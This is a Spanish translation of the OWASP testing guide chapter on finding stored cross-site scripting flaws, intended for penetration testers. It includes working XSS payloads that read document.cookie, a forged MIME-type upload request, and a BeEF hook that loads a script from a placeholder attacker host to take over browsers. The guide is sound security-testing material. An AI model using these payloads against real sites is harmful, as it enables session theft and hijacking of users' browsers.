# Pruebas de Scripting entre Sitios Almacenado

|ID          |
|------------|
|WSTG-INPV-02|

## Resumen

El [Scripting entre sitios (XSS) almacenado](https://owasp.org/www-community/attacks/xss/) es el tipo más peligroso de Scripting entre Sitios. Las aplicaciones web que permiten a los usuarios almacenar datos están potencialmente expuestas a este tipo de ataque. Este capítulo ilustra ejemplos de inyección de scripting entre sitios almacenado y escenarios de explotación relacionados.

El XSS almacenado ocurre cuando una aplicación web recopila entrada de un usuario que podría ser maliciosa y luego almacena esa entrada en un almacén de datos para su uso posterior. La entrada que se almacena no se filtra correctamente. Como consecuencia, los datos maliciosos aparecerán como parte del sitio y se ejecutarán en el navegador del usuario bajo los privilegios de la aplicación web. Dado que esta vulnerabilidad típicamente involucra al menos dos solicitudes a la aplicación, también puede llamarse XSS de segundo orden.

Esta vulnerabilidad puede usarse para realizar una serie de ataques basados en navegador, incluyendo:

- Secuestro del navegador de otro usuario
- Captura de información sensible vista por los usuarios de la aplicación
- Defacement pseudo de la aplicación
- Escaneo de puertos de hosts internos ("internos" en relación con los usuarios de la aplicación web)
- Entrega dirigida de exploits basados en navegador
- Otras actividades maliciosas

El XSS almacenado no necesita un enlace malicioso para ser explotado. Una explotación exitosa ocurre cuando un usuario visita una página con XSS almacenado. Las siguientes fases se relacionan con un escenario típico de ataque XSS almacenado:

- El atacante almacena código malicioso en la página vulnerable
- El usuario se autentica en la aplicación
- El usuario visita la página vulnerable
- El código malicioso es ejecutado por el navegador del usuario

Este tipo de ataque también puede ser explotado con marcos de explotación de navegador como [BeEF](https://beefproject.com) y [XSS Proxy](https://xss-proxy.sourceforge.net/). Estos marcos permiten el desarrollo de exploits JavaScript complejos.

El XSS almacenado es particularmente peligroso en áreas de aplicación donde usuarios con altos privilegios tienen acceso. Cuando el administrador visita la página vulnerable, el ataque se ejecuta automáticamente por su navegador. Esto podría exponer información sensible como tokens de autorización de sesión.

## Objetivos de la Prueba

- Identificar entrada almacenada que se refleja en el lado del cliente.
- Evaluar la entrada que aceptan y la codificación que se aplica al devolver (si la hay).

## Cómo Probar

### Pruebas de Caja Negra

El proceso para identificar vulnerabilidades de XSS almacenado es similar al proceso descrito durante las [pruebas de XSS reflejado](01-Testing_for_Reflected_Cross_Site_Scripting-es.md).

#### Formularios de Entrada

El primer paso es identificar todos los puntos donde la entrada del usuario se almacena en el backend y luego se muestra por la aplicación. Ejemplos típicos de entrada de usuario almacenada se pueden encontrar en:

- Página de Perfiles de Usuario: la aplicación permite al usuario editar/cambiar detalles de perfil como nombre, apellido, apodo, avatar, imagen, dirección, etc.
- Carrito de Compras: la aplicación permite al usuario almacenar artículos en el carrito de compras que luego pueden revisarse más tarde
- Administrador de Archivos: aplicación que permite la subida de archivos
- Configuraciones/Preferencias de Aplicación: aplicación que permite al usuario establecer preferencias
- Foro/Tablón de Mensajes: aplicación que permite el intercambio de publicaciones entre usuarios
- Blog: si la aplicación de blog permite a los usuarios enviar comentarios
- Registro: si la aplicación almacena alguna entrada de usuarios en registros.

#### Analizar Código HTML

La entrada almacenada por la aplicación normalmente se usa en etiquetas HTML, pero también puede encontrarse como parte de contenido JavaScript. En esta etapa, es fundamental entender si la entrada se almacena y cómo se posiciona en el contexto de la página. Diferentemente del XSS reflejado, el probador de penetración también debería investigar cualquier canal fuera de banda a través del cual la aplicación recibe y almacena entrada de usuarios.

**Nota**: Todas las áreas de la aplicación accesibles por administradores deberían probarse para identificar la presencia de cualquier dato enviado por usuarios.

**Ejemplo**: Correo electrónico almacenado en `index2.php`

![Ejemplo de Entrada Almacenada](images/Stored_input_example.jpg)\
*Figura 4.7.2-1: Ejemplo de Entrada Almacenada*

El código HTML de index2.php donde se encuentra el valor del correo electrónico:

```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com" />
```

En este caso, el probador necesita encontrar una forma de inyectar código fuera de la etiqueta `<input>` como abajo:

```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"> CÓDIGO MALICIOSO <!-- />
```

#### Pruebas de XSS Almacenado

Esto implica probar los controles de validación y filtrado de entrada de la aplicación. Ejemplos básicos de inyección en este caso:

- `aaa@aa.com"><script>alert(document.cookie)</script>`
- `aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E`

Asegúrese de que la entrada se envíe a través de la aplicación. Esto normalmente implica deshabilitar JavaScript si se implementan controles de seguridad del lado del cliente o modificar la solicitud HTTP con un proxy web. También es importante probar la misma inyección con solicitudes HTTP GET y POST. La inyección anterior resulta en una ventana emergente que contiene los valores de las cookies.

> ![Ejemplo de XSS Almacenado](images/Stored_xss_example.jpg)\
> *Figura 4.7.2-2: Ejemplo de Entrada Almacenada*
>
> El código HTML siguiente a la inyección:
>
> ```html
> <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"><script>alert(document.cookie)</script>
> ```
>
> La entrada se almacena y la carga útil XSS se ejecuta por el navegador al recargar la página. Si la entrada es escapada por la aplicación, los probadores deberían probar la aplicación para filtros XSS. Por ejemplo, si la cadena "SCRIPT" se reemplaza por un espacio o por un carácter NULL, entonces esto podría ser una señal potencial de filtrado XSS en acción. Muchas técnicas existen para evadir filtros de entrada (ver capítulo de [pruebas de XSS reflejado](01-Testing_for_Reflected_Cross_Site_Scripting-es.md)). Se recomienda encarecidamente que los probadores se refieran a [XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet) y páginas de trucos [Mario](https://cybersecurity.wtf/encoder/) XSS, que proporcionan una lista extensa de ataques XSS y bypasses de filtrado. Consulte la sección de whitepapers y herramientas para información más detallada.

#### Aprovechar XSS Almacenado con BeEF

El XSS almacenado puede ser explotado por marcos avanzados de explotación JavaScript como [BeEF](https://www.beefproject.com) y [XSS Proxy](https://xss-proxy.sourceforge.net/).

Un escenario típico de explotación BeEF involucra:

- Inyectar un gancho JavaScript que comunica al marco de explotación de navegador del atacante (BeEF)
- Esperar a que el usuario de la aplicación vea la página vulnerable donde se muestra la entrada almacenada
- Controlar el navegador del usuario de la aplicación a través de la consola BeEF

El gancho JavaScript puede inyectarse explotando la vulnerabilidad XSS en la aplicación web.

**Ejemplo**: Inyección BeEF en `index2.php`:

```html
aaa@aa.com"><script src=https://attackersite/hook.js></script>
```

Cuando el usuario carga la página `index2.php`, el script `hook.js` es ejecutado por el navegador. Es entonces posible acceder a cookies, captura de pantalla del usuario, portapapeles del usuario y lanzar ataques XSS complejos.

> ![Ejemplo de Inyección BeEF](images/RubyBeef.png)\
> *Figura 4.7.2-3: Ejemplo de Inyección BeEF*
>
> Este ataque es particularmente efectivo en páginas vulnerables que son vistas por muchos usuarios con diferentes privilegios.

#### Subida de Archivos

Si la aplicación web permite la subida de archivos, es importante verificar si es posible subir contenido HTML. Por ejemplo, si se permiten archivos HTML o TXT, la carga útil XSS puede inyectarse en el archivo subido. El probador de penetración también debería verificar si la subida de archivos permite establecer tipos MIME arbitrarios.

Considere la siguiente solicitud HTTP POST para subida de archivos:

```http
POST /fileupload.aspx HTTP/1.1
[…]
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.txt"
Content-Type: text/plain

test
```

Este defecto de diseño puede explotarse en ataques de manejo erróneo de MIME del navegador. Por ejemplo, archivos aparentemente inocuos como JPG y GIF pueden contener una carga útil XSS que se ejecuta cuando son cargados por el navegador. Esto es posible cuando el tipo MIME para una imagen como `image/gif` puede establecerse en su lugar a `text/html`. En este caso, el archivo será tratado por el navegador cliente como HTML.

Solicitud HTTP POST falsificada:

```html
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.gif"
Content-Type: text/html

<script>alert(document.cookie)</script>
```

También considere que Internet Explorer no maneja tipos MIME de la misma manera que Mozilla Firefox u otros navegadores. Por ejemplo, Internet Explorer maneja archivos TXT con contenido HTML como contenido HTML. Para más información sobre manejo de MIME, consulte la sección de whitepapers al final de este capítulo.

### Scripting entre Sitios Ciego

El Scripting entre Sitios Ciego es una forma de XSS almacenado. Generalmente ocurre cuando la carga útil del atacante se guarda en el servidor/infraestructura y luego se refleja de vuelta a la víctima desde la aplicación backend. Por ejemplo en formularios de retroalimentación, un atacante puede enviar la carga útil maliciosa usando el formulario, y una vez que el usuario/admin backend de la aplicación ve el envío del atacante a través de la aplicación backend, la carga útil del atacante se ejecutará. El Scripting entre Sitios Ciego es difícil de confirmar en el escenario del mundo real, pero una de las mejores herramientas para esto es [XSS Hunter](https://xsshunter.com/).

> Nota: Los probadores deberían considerar cuidadosamente las implicaciones de privacidad del uso de servicios públicos o de terceros al realizar pruebas de seguridad. (Ver #tools.)

### Pruebas de Caja Gris

Las pruebas de caja gris son similares a las pruebas de caja negra. En las pruebas de caja gris, el probador de penetración tiene conocimiento parcial de la aplicación. En este caso, información sobre entrada de usuario, controles de validación de entrada y almacenamiento de datos podría ser conocida por el probador de penetración.

Dependiendo de la información disponible, normalmente se recomienda que los probadores verifiquen cómo se procesa la entrada del usuario por la aplicación y luego se almacena en el sistema backend. Los siguientes pasos se recomiendan:

- Usar la aplicación frontend e ingresar entrada con caracteres especiales/inválidos
- Analizar respuesta(s) de la aplicación
- Identificar presencia de controles de validación de entrada
- Acceder al sistema backend y verificar si la entrada se almacena y cómo se almacena
- Analizar código fuente y entender cómo se renderiza la entrada almacenada por la aplicación

Si el código fuente está disponible (como en pruebas de caja blanca), todas las variables usadas en formularios de entrada deberían analizarse. En particular, lenguajes de programación como PHP, ASP y JSP usan variables/funciones predefinidas para almacenar entrada de solicitudes HTTP GET y POST.

La siguiente tabla resume algunas variables y funciones especiales a buscar al analizar código fuente:

| **PHP**        | **ASP**           |  **JSP**         |
|----------------|-------------------|------------------|
| `$_GET` - Variables HTTP GET  | `Request.QueryString` - HTTP GET | `doGet`, `doPost` servlets - HTTP GET y POST |
| `$_POST` - Variables HTTP POST| `Request.Form` - HTTP POST | `request.getParameter` - Variables HTTP GET/POST |
| `$_REQUEST` – Variables HTTP POST, GET y COOKIE | `Server.CreateObject` - usado para subir archivos | |
| `$_FILES` - Variables de Subida de Archivos HTTP | | |

**Nota**: La tabla anterior es solo un resumen de los parámetros más importantes, pero todos los parámetros de entrada de usuario deberían investigarse.

## Herramientas

- [PHP Charset Encoder(PCE)](https://cybersecurity.wtf/encoder/) te ayuda a codificar textos arbitrarios hacia y desde 65 tipos de conjuntos de caracteres que puedes usar en tus cargas útiles personalizadas.
- [Hackvertor](https://hackvertor.co.uk/public) es una herramienta en línea que permite muchos tipos de codificación y ofuscación de JavaScript (o cualquier entrada de cadena).
- [BeEF](https://www.beefproject.com) es el marco de explotación de navegador. Una herramienta profesional para demostrar el impacto en tiempo real de vulnerabilidades de navegador.
- [XSS-Proxy](https://xss-proxy.sourceforge.net/) es una herramienta avanzada de ataque Cross-Site-Scripting (XSS).
- [Burp Proxy](https://portswigger.net/burp/) es un servidor proxy HTTP/S interactivo para atacar y probar aplicaciones web.
- [XSS Assistant](https://www.greasespot.net/) Script Greasemonkey que permite a los usuarios probar fácilmente cualquier aplicación web para fallos de cross-site-scripting.
- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org) es un servidor proxy HTTP/S interactivo para atacar y probar aplicaciones web con un escáner integrado.
- [XSS Hunter Portable](https://github.com/mandatoryprogrammer/xsshunter) XSS Hunter encuentra todo tipo de vulnerabilidades de cross-site scripting, incluyendo el a menudo perdido blind XSS.

## Referencias

### Recursos OWASP

- [XSS Filter Evasion Cheat Sheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

### Libros

- Joel Scambray, Mike Shema, Caleb Sima - "Hacking Exposed Web Applications", Second Edition, McGraw-Hill, 2006 - ISBN 0-07-226229-0
- Dafydd Stuttard, Marcus Pinto - "The Web Application's Handbook - Discovering and Exploiting Security Flaws", 2008, Wiley, ISBN 978-0-470-17077-9
- Jeremiah Grossman, Robert "RSnake" Hansen, Petko "pdp" D. Petkov, Anton Rager, Seth Fogie - "Cross Site Scripting Attacks: XSS Exploits and Defense", 2007, Syngress, ISBN-10: 1-59749-154-3

### Whitepapers

- [CERT: "CERT Advisory CA-2000-02 Malicious HTML Tags Embedded in Client Web Requests"](https://resources.sei.cmu.edu/library/asset-view.cfm?assetID=496186)
- [Amit Klein: "Cross-site Scripting Explained"](https://courses.csail.mit.edu/6.857/2009/handouts/css-explained.pdf)
- [CGISecurity.com: "The Cross Site Scripting FAQ"](https://www.cgisecurity.com/xss-faq.html)